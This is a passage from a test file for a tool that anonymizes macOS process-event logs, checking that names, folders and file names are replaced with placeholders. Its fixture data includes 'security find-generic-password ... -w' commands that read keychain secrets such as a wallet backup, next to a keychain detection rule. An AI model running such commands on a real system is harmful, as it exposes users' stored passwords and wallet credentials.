      run(721, '/usr/bin/grep', ['grep', '-sh', '-c', 'John Smith', 'notes.txt'], docs, 2),
      run(722, '/usr/bin/du', ['du', '-sh', '-c', '/Users/jdoe/Documents/Board Docs'], '/', 3),
      run(723, '/bin/ls', ['ls', '-su', '-c', 'Jane Roe'], docs, 4),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const n = keyed(r.key, 'name');
    const args = events(r.out).map(e => e.event.exec.args as string[]);
    expect(args).toEqual([
      ['du', '-sh', '-c', n.get('Board Docs')],
      ['grep', '-sh', '-c', n.get('John Smith'), n.get('notes.txt')],
      ['du', '-sh', '-c', `/Users/user1/Documents/${n.get('Board Docs')}`],
      ['ls', '-su', '-c', n.get('Jane Roe')],
    ]);
    expect(r.out).not.toMatch(/Board|Docs|John|Smith|Jane|Roe|jdoe/);
    sameFindings(input, r.out);
  });

  // The keychain rule reads its phrases from security's arguments; in any other command a quoted name is a name.
  test('a quoted name with a wallet word in shell code is a name, unless the code runs security', () => {
    const docs = '/Users/jdoe/Documents';
    const input = [
      run(730, '/bin/sh', ['sh', '-c', 'cp "John Smith Exodus Backup.pdf" /tmp/x'], docs, 1),
      run(731, '/bin/sh', ['sh', '-c', 'security find-generic-password -l "jdoe Exodus backup" -w'], docs, 2),
      run(732, '/bin/sh', ['sh', '-c', '/usr/bin/security find-generic-password -s "jdoe Safe Storage" -w'], docs, 3),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const n = keyed(r.key, 'name');
    const args = events(r.out).map(e => e.event.exec.args as string[]);
    expect(args[0]![2]).toBe(`cp "${n.get('John Smith Exodus Backup.pdf')}" /tmp/${n.get('x')}`);
    expect(args[1]![2]).toBe('security find-generic-password -l "user1 Exodus backup" -w');
    expect(args[2]![2]).toBe('/usr/bin/security find-generic-password -s "user1 Safe Storage" -w');
    expect(r.out).not.toMatch(/John|Smith|jdoe/);
    sameFindings(input, r.out);
  });

  test('common command verbs stay, even when a home folder has that name', () => {
    const input = [
      ...['commit', 'install', 'push', 'status'].map((w, i) => esCreate(zsh, { path: `/Users/jdoe/Documents/${w}/f.txt` }, i + 1)),
      run(601, '/usr/bin/git', ['git', 'commit', '-m', 'wip'], '/Users/jdoe/Documents', 10),
      run(602, '/opt/homebrew/bin/brew', ['brew', 'install', 'wget'], '/Users/jdoe/Documents', 11),
      run(603, '/bin/sh', ['sh', '-c', 'git push && git status'], '/Users/jdoe/Documents', 12),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const args = events(r.out).filter(e => e.event.exec).map(e => e.event.exec.args as string[]);
    expect(args).toEqual([['git', 'commit', '-m', 'wip'], ['brew', 'install', 'wget'], ['sh', '-c', 'git push && git status']]);
  });

  test('the bare name of a link or a clone is cleaned as the last name of its folder', () => {
    const input = [
      esLink(zsh, '/Users/jdoe/Documents/Q3-acquisition.pdf', '/Users/jdoe/Desktop', 'Board copy.pdf', 1),
      esClone(zsh, '/Users/jdoe/Documents/Q3-acquisition.pdf', '/Users/jdoe/Desktop/Merger', 'Q3-acquisition.pdf', 2),
    ].join('\n') + '\n';
    const r = runClean(['clean', '-o', '-'], { input });
    expect(r.status, r.stderr).toBe(0);
    const n = keyed(r.key, 'name');
    const ev = events(r.out);
    expect(ev[0]!.event.link.target_dir.path).toBe('/Users/user1/Desktop');
    expect(ev[0]!.event.link.target_filename).toBe(n.get('Board copy.pdf'));
    expect(ev[1]!.event.clone.target_dir.path).toBe(`/Users/user1/Desktop/${n.get('Merger')}`);
    expect(ev[1]!.event.clone.target_name).toBe(n.get('Q3-acquisition.pdf'));
    for (const s of ['Q3', 'Board', 'Merger']) expect(r.out, s).not.toContain(s);
  });
});
